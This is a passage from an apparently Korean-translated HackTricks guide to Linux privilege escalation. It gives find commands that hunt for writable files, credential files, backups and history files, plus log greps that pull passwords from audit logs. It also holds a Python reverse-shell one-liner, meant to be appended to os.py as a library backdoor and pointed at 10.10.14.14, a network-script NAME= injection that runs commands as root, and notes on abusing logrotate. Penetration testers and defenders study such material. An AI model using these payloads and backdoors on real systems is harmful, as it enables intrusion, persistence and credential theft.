#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 마지막 분에 수정된 파일
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 파일
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 파일
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 숨겨진 파일
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH의 스크립트/바이너리**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **웹 파일**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **백업**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 비밀번호가 포함된 알려진 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 코드를 읽어보세요. 이 도구는 **비밀번호가 포함될 수 있는 여러 파일을 검색합니다**.\
**또 다른 흥미로운 도구**는 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)로, 이는 Windows, Linux 및 Mac에서 로컬 컴퓨터에 저장된 많은 비밀번호를 검색하는 데 사용되는 오픈 소스 애플리케이션입니다.

### 로그

로그를 읽을 수 있다면, **그 안에서 흥미롭거나 기밀 정보를 찾을 수 있을지도 모릅니다**. 로그가 이상할수록 더 흥미로울 것입니다 (아마도).\
또한, "**잘못된**" 구성(백도어가 있는?) **감사 로그**는 이 게시물에서 설명한 대로 감사 로그에 **비밀번호를 기록**할 수 있게 해줄 수 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
로그를 **읽기 위해 그룹** [**adm**](interesting-groups-linux-pe/#adm-group)가 정말 유용할 것입니다.

### 셸 파일
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

파일 이름이나 내용에 "**password**"라는 단어가 포함된 파일을 확인하고, 로그 내의 IP와 이메일, 또는 해시 정규 표현식도 확인해야 합니다.\
이 모든 것을 수행하는 방법을 여기서 나열하지는 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 체크를 확인할 수 있습니다.

## Writable files

### Python library hijacking

어디서 **python** 스크립트가 실행될 것인지 알고 있고, 해당 폴더에 **쓰기**가 가능하거나 **python 라이브러리**를 **수정**할 수 있다면, OS 라이브러리를 수정하고 백도어를 설치할 수 있습니다(파이썬 스크립트가 실행될 위치에 쓸 수 있다면 os.py 라이브러리를 복사하여 붙여넣기 하세요).

라이브러리를 **백도어**하려면 os.py 라이브러리의 끝에 다음 줄을 추가하세요(IP와 PORT를 변경하세요):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 취약점

`logrotate`의 취약점은 로그 파일이나 그 상위 디렉토리에 **쓰기 권한**이 있는 사용자가 잠재적으로 권한 상승을 얻을 수 있게 합니다. 이는 `logrotate`가 종종 **root**로 실행되기 때문에, _**/etc/bash_completion.d/**_와 같은 디렉토리에서 임의의 파일을 실행하도록 조작될 수 있습니다. 로그 회전이 적용되는 모든 디렉토리뿐만 아니라 _/var/log_에서도 권한을 확인하는 것이 중요합니다.

> [!NOTE]
> 이 취약점은 `logrotate` 버전 `3.18.0` 및 이전 버전에 영향을 미칩니다.

취약점에 대한 더 자세한 정보는 이 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)으로 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx 로그)**와 매우 유사하므로, 로그를 변경할 수 있는 경우 로그를 관리하는 사람이 누구인지 확인하고, 심볼릭 링크로 로그를 대체하여 권한 상승이 가능한지 확인하십시오.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**취약점 참조:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

어떤 이유로든 사용자가 _/etc/sysconfig/network-scripts_에 `ifcf-<whatever>` 스크립트를 **쓰기** 할 수 있거나 기존 스크립트를 **조정**할 수 있다면, 당신의 **시스템은 pwned**입니다.

네트워크 스크립트, 예를 들어 _ifcg-eth0_는 네트워크 연결에 사용됩니다. 이들은 .INI 파일과 정확히 같습니다. 그러나 이들은 Linux에서 Network Manager( dispatcher.d)에 의해 \~소스\~됩니다.

내 경우, 이 네트워크 스크립트에서 `NAME=` 속성이 올바르게 처리되지 않습니다. 이름에 **공백이 있는 경우 시스템은 공백 이후의 부분을 실행하려고 시도합니다**. 이는 **첫 번째 공백 이후의 모든 것이 root로 실행된다는 것을 의미합니다**.

예를 들어: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, 및 rc.d**

디렉토리 `/etc/init.d`는 **System V init (SysVinit)**을 위한 **스크립트**의 집합입니다. 이는 **고전적인 리눅스 서비스 관리 시스템**으로, 서비스의 `start`, `stop`, `restart`, 때때로 `reload`를 위한 스크립트를 포함합니다. 이 스크립트는 직접 실행하거나 `/etc/rc?.d/`에 있는 심볼릭 링크를 통해 실행할 수 있습니다. Redhat 시스템의 대체 경로는 `/etc/rc.d/init.d`입니다.

반면에, `/etc/init`는 **Upstart**와 관련이 있으며, 이는 우분투에서 도입된 최신 **서비스 관리**로, 서비스 관리 작업을 위한 구성 파일을 사용합니다. Upstart로의 전환에도 불구하고, SysVinit 스크립트는 Upstart 구성과 함께 여전히 사용됩니다.

**systemd**는 현대적인 초기화 및 서비스 관리자이며, 온디맨드 데몬 시작, 자동 마운트 관리, 시스템 상태 스냅샷과 같은 고급 기능을 제공합니다. 이는 배포 패키지를 위한 `/usr/lib/systemd/`와 관리자의 수정을 위한 `/etc/systemd/system/`에 파일을 정리하여 시스템 관리 프로세스를 간소화합니다.

## 기타 트릭

### NFS 권한 상승

{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 제한된 셸에서 탈출하기

{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage

{{#ref}}
cisco-vmanage.md
{{#endref}}

## 커널 보안 보호

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 추가 도움

[정적 impacket 바이너리](https://github.com/ropnop/impacket_static_binaries)

## 리눅스/유닉스 권한 상승 도구

### **리눅스 로컬 권한 상승 벡터를 찾기 위한 최고의 도구:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 옵션)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 리눅스 및 MAC의 커널 취약점 열거 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (물리적 접근):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**더 많은 스크립트의 수집**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 참고자료

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{{#include ../../banners/hacktricks-training.md}}
